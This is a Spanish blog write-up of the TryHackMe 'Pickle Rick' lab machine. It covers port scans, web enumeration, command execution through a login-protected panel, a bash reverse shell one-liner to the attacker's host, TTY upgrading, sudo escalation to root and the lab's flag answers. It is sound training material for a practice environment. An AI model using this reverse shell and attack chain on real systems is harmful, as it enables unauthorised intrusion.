---
layout: single
title: Pickle Rick - TryHackMe
excerpt: "Pickle Rick es una máquina Linux creada por tryhackme, bastante sencilla y con varias formas
de resolverla. Una forma de resolverla es via web y la otra obteniendo una shell desde un panel de comandos. A continuación veremos
la segunda opción que al menos para mi es la que más me gusta."
date: 2021-10-19
classes: wide
header:
  teaser: /assets/images/thm-pickleRick/R&M.jpeg
  teaser_home_page: true
  icon: /assets/images/thm.png
categories:
  - tryhackme
  - linux
  - fácil
tags:
  - enumeration
  - nse
  - netcat
  - tryhackme
---

### Escaneo de puertos
```bash
nmap -p- -T5 --open -v -n -Pn 10.10.49.73

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Escaneo de servicios
```bash
nmap -sCV -p 22,80 10.10.49.73 -oN servicios

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:48:1a:e6:09:09:2d:c7:7b:61:30:e1:86:25:49:a0 (RSA)
|   256 e9:70:fe:46:12:a4:ca:dd:74:75:86:36:a5:0b:b2:33 (ECDSA)
|_  256 83:38:e1:b1:93:ad:a6:a7:e4:9b:aa:74:2d:8b:8c:b5 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Enumeración con http-enum.nse
```bash
nmap --script http-enum -p80 10.10.49.73                                 

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|_  /robots.txt: Robots file
```

### Curl 
```bash
curl -s http://10.10.49.73/robots.txt                          
Wubbalubbadubdub
```

### HTTP
Página principal

![](/assets/images/thm-pickleRick/web.png)

Inspeccionando el código fuente de la web encuentro un username.

![](/assets/images/thm-pickleRick/username.png)

Introduzco la contraseña encontrada en el archivo `robots.txt`

![](/assets/images/thm-pickleRick//login.png)

Puedo ejecutar comandos en el command panel.

![](/assets/images/thm-pickleRick/commandPanel.png)

Al poder ejecutar comandos dejo un netcat a la escucha para entablarme una reverse shell.

![](/assets/images/thm-pickleRick/bash.png)

`bash -c "bash -i >& /dev/tcp/10.9.2.75/443 0>&1"`

### Tratamiento TTY
Una vez obtengo la shell hago un tratamiento tty para tener una shell funcional.
```bash
script /dev/null -c bash
control + Z
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

### Elevación de privilegios
```bash
www-data@ip-10-10-49-73:/home/rick$ sudo -l

User www-data may run the following commands on
        ip-10-10-49-73.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Lanzo `sudo su` y obtengo el root

Una vez como root encontramos el primer igrediente.
```bash
root@ip-10-10-49-73:/var/www/html# cat Sup3rS3cretPickl3Ingred.txt 
mr. meeseek hair
```

En el directorio del ususario Rick el segundo ingrediente.
```bash
root@ip-10-10-49-73:/home/rick# cat second\ ingredients 
1 jerry tear
```

En el directorio root tenemos el tercer y último ingrediente.

```bash
root@ip-10-10-49-73:~# pwd
/root
root@ip-10-10-49-73:~# ls -la
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Oct 19 10:54 ..
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
drwx------  2 root root 4096 Feb 10  2019 .ssh
root@ip-10-10-49-73:~# cat 3rd.txt 
3rd ingredients: fleeb juice
```
